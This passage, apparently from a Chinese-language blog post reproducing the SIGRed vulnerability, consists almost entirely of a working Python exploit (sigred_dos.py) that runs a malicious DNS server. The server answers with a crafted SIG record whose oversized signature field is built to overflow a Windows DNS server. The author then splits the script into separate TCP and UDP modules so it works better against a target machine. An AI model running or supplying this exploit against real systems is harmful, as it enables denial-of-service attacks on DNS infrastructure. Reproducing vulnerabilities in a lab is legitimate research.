<span class="comment"># Type covered</span></span><br><span class="line">sig += <span class="string">&quot;\x05&quot;</span> <span class="comment"># Algorithm - RSA/SHA1</span></span><br><span class="line">sig += <span class="string">&quot;\x00&quot;</span> <span class="comment"># Labels</span></span><br><span class="line">sig += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">sig += <span class="string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="comment"># Signature Expiration</span></span><br><span class="line">sig += <span class="string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="comment"># Signature Inception</span></span><br><span class="line">sig += <span class="string">&quot;\x9e\x04&quot;</span> <span class="comment"># Key Tag</span></span><br><span class="line">sig += <span class="string">&quot;\xc0\x0d&quot;</span> <span class="comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span></span><br><span class="line">sig += (<span class="string">&quot;\x00&quot;</span>*(<span class="number">19</span> - <span class="built_in">len</span>(domain)) + (<span class="string">&quot;\x0f&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">15</span>)*<span class="number">5</span>).ljust(<span class="number">65465</span> - <span class="built_in">len</span>(domain_compressed), <span class="string">&quot;\x00&quot;</span>) <span class="comment"># Signature - Here be overflows!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Header</span></span><br><span class="line">hdr = <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Points to &quot;9.domain&quot;</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">hdr += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(sig)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS Header</span></span><br><span class="line">response = <span class="string">&quot;\x81\xa0&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name (9.domain)</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">data += connection.recv(<span class="number">65535</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">len_msg = <span class="built_in">len</span>(response + hdr + sig) + <span class="number">2</span> <span class="comment"># +2 for the transaction ID</span></span><br><span class="line"><span class="comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span></span><br><span class="line">connection.sendall(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="number">2</span>:<span class="number">4</span>] + response + hdr + sig)</span><br><span class="line">connection.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The UDP server is contacted first</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">udp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">server_address = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">server_port = <span class="number">53</span></span><br><span class="line">response = <span class="string">&quot;\x83\x80&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Queries</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Data</span></span><br><span class="line">data = <span class="string">&quot;\x03ns1\xc0\x0c&quot;</span> <span class="comment"># ns1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">data += <span class="string">&quot;\x03ms1\xc0\x0c&quot;</span> <span class="comment"># ms1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">data += <span class="string">&quot;\x0b\xff\xb4\x5f&quot;</span> <span class="comment"># Serial Number</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x0e\x10&quot;</span> <span class="comment"># Refresh Interval</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x2a\x30&quot;</span> <span class="comment"># Response Interval</span></span><br><span class="line">data += <span class="string">&quot;\x00\x01\x51\x80&quot;</span> <span class="comment"># Expiration Limit</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># Minimum TTL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Authoritative Nameservers</span></span><br><span class="line">response += <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Compressed pointer to &quot;4.ibrokethe.net&quot;</span></span><br><span class="line">response += <span class="string">&quot;\x00\x06&quot;</span> <span class="comment"># Type: SOA</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">response += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(data)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line">sock.bind((server_address, server_port))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">recvd, client_address = sock.recvfrom(<span class="number">65535</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received UDP connection&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(recvd) &gt; <span class="number">2</span>:</span><br><span class="line">sent = sock.sendto(recvd[:<span class="number">2</span>] + response + data, client_address)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;python sigred_dos.py evil_domain&quot;</span>) <span class="comment"># For example, I ran python `sigred_dos.py ibrokethe.net`</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Domain name must be *a maximum* of 19 characters in length</span></span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(domain) &gt; <span class="number">19</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Domain length must be less than 20 characters&quot;</span>)</span><br><span class="line"></span><br><span class="line">setup()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sets up two servers: one on UDP port 53 and one on TCP port 53</span></span><br><span class="line">first = threading.Thread(target=udp_server)</span><br><span class="line">second = threading.Thread(target=tcp_server)</span><br><span class="line"></span><br><span class="line">first.start()</span><br><span class="line">second.start()</span><br><span class="line"></span><br><span class="line">first.join()</span><br><span class="line">second.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    这个脚本的总的思路来说就是利用双线程运行了tcp_server与udp_server两个模块，两模块中其实耦合还是很强的，将消息内容硬编码到字符串中，然后发送给靶机。</p><p>​    然而其实双线程并不好用，所以我们来对脚本进行一个小修正，将其分为tcp和udp连接两个模块，同时启动，在ucp模块执行时，tcp等待：</p><p><strong>tcp_connect.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">domain = <span class="literal">None</span></span><br><span class="line">domain_compressed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>():</span></span><br><span class="line"><span class="keyword">global</span> domain_compressed</span><br><span class="line"><span class="comment"># Setup</span></span><br><span class="line">domain_split = [<span class="built_in">chr</span>(<span class="built_in">len</span>(i)) + i <span class="keyword">for</span> i <span class="keyword">in</span> domain.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">domain_compressed = <span class="string">&quot;&quot;</span>.join(domain_split) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">53</span>))</span><br><span class="line">sock.listen(<span class="number">50</span>)</span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">connection, client_address = sock.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received TCP Connection&quot;</span>)</span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Contents</span></span><br><span class="line">sig = <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Type covered</span></span><br><span class="line">sig += <span class="string">&quot;\x05&quot;</span> <span class="comment"># Algorithm - RSA/SHA1</span></span><br><span class="line">sig += <span class="string">&quot;\x00&quot;</span> <span class="comment"># Labels</span></span><br><span class="line">sig += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">sig += <span class="string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="comment"># Signature Expiration</span></span><br><span class="line">sig += <span class="string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="comment"># Signature Inception</span></span><br><span class="line">sig += <span class="string">&quot;\x9e\x04&quot;</span> <span class="comment"># Key Tag</span></span><br><span class="line">sig += <span class="string">&quot;\xc0\x0d&quot;</span> <span class="comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span></span><br><span class="line">sig += (<span class="string">&quot;\x00&quot;</span>*(<span class="number">19</span> - <span class="built_in">len</span>(domain)) + (<span class="string">&quot;\x0f&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">15</span>)*<span class="number">5</span>).ljust(<span class="number">65465</span> - <span class="built_in">len</span>(domain_compressed), <span class="string">&quot;\x00&quot;</span>) <span class="comment"># Signature - Here be overflows!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Header</span></span><br><span class="line">hdr = <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Points to &quot;9.domain&quot;</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">hdr += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(sig)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS Header</span></span><br><span class="line">response = <span class="string">&quot;\x81\xa0&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name (9.domain)</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">data += connection.recv(<span class="number">65535</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">len_msg = <span class="built_in">len</span>(response + hdr + sig) + <span class="number">2</span> <span class="comment"># +2 for the transaction ID</span></span><br><span class="line"><span class="comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span></span><br><span class="line">connection.sendall(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="number">2</span>:<span class="number">4</span>] + response + hdr + sig)</span><br><span class="line">connection.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;python sigred_dos.py evil_domain&quot;</span>) <span class="comment"># For example, I ran python `sigred_dos.py ibrokethe.net`</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Domain name must be *a maximum* of 19 characters in length</span></span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(domain) &gt; <span class="number">19</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Domain length must be less than 20 characters&quot;</span>)</span><br><span class="line"></span><br><span class="line">setup()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;finish_setup&#x27;</span>)</span><br><span class="line">    tcp_server()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tcp_finish&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><strong>udp_connect.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">domain = <span class="literal">None</span></span><br><span class="line">domain_compressed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>():</span></span><br><span class="line"><span class="keyword">global</span> domain_compressed</span><br><span class="line"><span class="comment"># Setup</span></span><br><span class="line">domain_split = [<span class="built_in">chr</span>(<span class="built_in">len</span>(i)) + i <span class="keyword">for</span> i <span class="keyword">in</span> domain.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">domain_compressed = <span class="string">&quot;&quot;</span>.join(domain_split) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># The UDP server is contacted first</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">udp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">server_address = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">server_port = <span class="number">53</span></span><br><span class="line">response = <span class="string">&quot;\x83\x80&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Queries</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Data</span></span><br><span class="line">data = <span class="string">&quot;\x03ns1\xc0\x0c&quot;</span> <span class="comment"># ns1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">data += <span class="string">&quot;\x03ms1\xc0\x0c&quot;</span> <span class="comment"># ms1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">data += <span class="string">&quot;\x0b\xff\xb4\x5f&quot;</span> <span class="comment"># Serial Number</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x0e\x10&quot;</span> <span class="comment"># Refresh Interval</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x2a\x30&quot;</span> <span class="comment"># Response Interval</span></span><br><span class="line">data += <span class="string">&quot;\x00\x01\x51\x80&quot;</span> <span class="comment"># Expiration Limit</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># Minimum TTL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Authoritative Nameservers</span></span><br><span class="line">response += <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Compressed pointer to &quot;4.ibrokethe.net&quot;</span></span><br><span class="line">response += <span class="string">&quot;\x00\x06&quot;</span> <span class="comment"># Type: SOA</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">response += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(data)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line">sock.bind((server_address, server_port))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">recvd, client_address = sock.recvfrom(<span class="number">65535</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received UDP connection&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(recvd) &gt; <span class="number">2</span>:</span><br><span class="line">sent = sock.sendto(recvd[:<span class="number">2</span>] + response + data, client_address)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">53</span>))</span><br><span class="line">sock.listen(<span class="number">50</span>)</span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tcp start listens&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">connection, client_address = sock.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received TCP Connection&quot;</span>)</span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Contents</span></span><br><span class="line">sig = <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Type covered</span></span><br><span class="line">sig += <span class="string">&quot;\x05&quot;</span> <span class="comment"># Algorithm - RSA/SHA1</span></span><br><span class="line">sig += <span class="string">&quot;\x00&quot;</span> <span class="comment"># Labels</span></span><br><span class="line">sig += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">sig += <span class="string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="comment"># Signature Expiration</span></span><br><span class="line">sig += <span class="string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="comment"># Signature Inception</span></span><br><span class="line">sig += <span class="string">&quot;\x9e\x04&quot;</span> <span class="comment"># Key Tag</span></span><br><span class="line">sig += <span class="string">&quot;\xc0\x0d&quot;</span> <span class="comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span></span><br><span class="line">sig += (<span class="string">&quot;\x00&quot;</span>*(<span class="number">19</span> - <span class="built_in">len</span>(domain)) + (<span class="string">&quot;\x0f&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">15</span>)*<span class="number">5</span>).ljust(<span class="number">65465</span> - <span class="built_in">len</span>(domain_compressed), <span class="string">&quot;\x00&quot;</span>) <span class="comment"># Signature - Here be overflows!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Header</span></span><br><span class="line">hdr = <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Points to &quot;9.domain&quot;</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">hdr += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(sig)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS Header</span></span><br><span class="line">response = <span class="string">&quot;\x81\xa0&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name (9.domain)</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">data += connection.recv(<span class="number">65535</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">len_msg = <span class="built_in">len</span>(response + hdr + sig) + <span class="number">2</span> <span class="comment"># +2 for the transaction ID</span></span><br><span class="line"><span class="comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span></span><br><span class="line">connection.sendall(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="number">2</span>:<span class="number">4</span>] + response + hdr + sig)</span><br><span class="line">connection.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;python sigred_dos.py evil_domain&quot;</span>) <span class="comment"># For example, I ran python `sigred_dos.py ibrokethe.net`</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Domain name must be *a maximum* of 19 characters in length</span></span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(domain) &gt; <span class="number">19</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Domain length must be less than 20 characters&quot;</span>)</span><br><span class="line"></span><br><span class="line">setup()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;finish_setup&#x27;</span>)</span><br><span class="line">    udp_server()</span><br><span class="line">    